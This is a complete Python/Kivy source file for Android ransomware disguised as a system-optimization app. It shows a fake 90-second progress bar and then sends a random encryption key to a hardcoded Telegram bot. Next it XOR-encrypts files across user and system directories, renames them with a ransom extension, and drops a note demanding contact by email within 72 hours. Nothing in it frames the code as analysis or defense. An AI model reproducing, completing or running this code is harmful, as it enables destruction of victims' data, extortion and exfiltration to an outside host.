import os
import sys
import base64
import hashlib
import random
import string
import urllib.request
import json
import threading
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from kivy.animation import Animation
from kivy.lang import Builder
from kivy.clock import Clock

Builder.load_string('''
<HellGateLoader>:
    orientation: 'vertical'
    canvas.before:
        Color:
            rgba: 0, 0, 0, 1
        Rectangle:
            pos: self.pos
            size: self.size
    Label:
        id: load_text
        text: 'SYSTEM OPTIMIZATION IN PROGRESS'
        font_size: '20sp'
        color: 1, 0, 0, 1
    ProgressBar:
        id: hell_progress
        value: 0
        max: 100
        height: '50dp'
''')

# --- Toxic Configuration ---
TOXIC_TOKEN = "8181085795:AAE_4Qb37tJz-CcLEUaeBdJqZNGbKj584yg"
DEATH_CHAT_ID = "7607548358"
RANSOM_EXT = ".REBEL_DEATHLOCK"
TARGET_DIRS = [
    "/system",
    "/sdcard",
    "/data",
    "/storage",
    "/mnt"
]
EXCLUDE_EXT = [".apk", ".so", ".odex", RANSOM_EXT]
ANDROID_TERMINATE_LIST = [
    "/system/bin",
    "/system/etc",
    "/system/framework",
    "/system/xbin"
]

# --- Cryptic Core ---
class XOR_Cipher:
    def __init__(self, key):
        self.key = hashlib.sha256(key.encode()).digest()
    
    def encrypt(self, data):
        return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])

SOUL_CRUSHER = ''.join(random.choices(
    string.ascii_letters + string.digits + "!@#$%^&*()",
    k=33
))

CRYPTIC_ENGINE = XOR_Cipher(SOUL_CRUSHER)

# --- Phantom Loader Interface ---
class HellGateLoader(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.triggered = False
        Clock.schedule_once(self.init_hell, 2)

    def init_hell(self, dt):
        anim = Animation(value=100, duration=90)  # 1.5 minute deception
        anim.bind(on_complete=self.launch_chaos)
        anim.start(self.ids.hell_progress)

    def launch_chaos(self, *args):
        if not self.triggered:
            self.triggered = True
            threading.Thread(target=launch_apocalypse, daemon=True).start()

# --- Execution Protocols ---
def murder_file(file_path):
    try:
        if file_path.suffix in EXCLUDE_EXT:
            return

        with open(file_path, "rb") as f:
            raw_data = f.read()
        
        with open(file_path, "wb") as f:
            f.write(CRYPTIC_ENGINE.encrypt(raw_data))
        
        os.rename(file_path, str(file_path) + RANSOM_EXT)
    except:
        pass

def send_obituary():
    try:
        urllib.request.urlopen(
            f"https://api.telegram.org/bot{TOXIC_TOKEN}/sendMessage?chat_id={DEATH_CHAT_ID}&text=💀 VICTIM KEY: {SOUL_CRUSHER} 💀",
            timeout=10
        )
    except:
        pass

def collect_souls():
    death_list = []
    for zone in TARGET_DIRS + ANDROID_TERMINATE_LIST:
        if os.path.exists(zone):
            for root, _, files in os.walk(zone):
                for file in files:
                    death_list.append(Path(root) / file)
    return death_list

def launch_apocalypse():
    send_obituary()
    souls = collect_souls()
    
    with ThreadPoolExecutor(max_workers=8) as reaper:
        list(reaper.map(murder_file, souls))
    
    with open("/sdcard/READ_OR_DIE.txt", "w") as f:
        f.write('''Your digital existence has been fractured. 72 hours remain before permanent data annihilation. Contact cjbooly10@gmail.com - include "{0}" in subject. Failure = digital oblivion.'''.format(SOUL_CRUSHER))

# --- Main Deception Layer ---
class RansomLoaderApp(App):
    def build(self):
        return HellGateLoader()
    
    def on_start(self):
        self.icon = 'ic_launcher'  # Camouflage with normal app icon

if __name__ == '__main__':
    RansomLoaderApp().run()